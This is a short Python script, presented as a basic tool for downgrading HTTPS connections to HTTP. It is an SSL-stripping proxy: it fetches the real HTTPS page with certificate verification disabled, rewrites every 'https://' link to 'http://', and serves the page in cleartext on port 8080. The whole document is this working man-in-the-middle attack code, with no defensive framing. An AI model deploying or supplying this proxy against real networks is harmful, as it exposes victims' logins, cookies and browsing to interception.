# Basic Script to Downgrade an https connection to http

# Code for required imports
import http.server
import socketserver
import requests
from urllib.parse import urlparse

# Defining Port Number
PORT = 8080

class DowngradeProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        url = f"http://{self.headers['Host']}{self.path}"

        # Fetch actual HTTPS content
        try:
            real_url = f"https://{self.headers['Host']}{self.path}"
            resp = requests.get(real_url, verify=False)

            # Modify content: replace https with http (downgrade)
            content = resp.text.replace("https://", "http://")

            # Send response
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content.encode("utf-8"))
        except Exception as e:
            self.send_error(500, f"Proxy Error: {str(e)}")

# Start server
with socketserver.TCPServer(("", PORT), DowngradeProxy) as httpd:
    print(f"[+] Downgrade Proxy Running on port {PORT}")
    httpd.serve_forever()
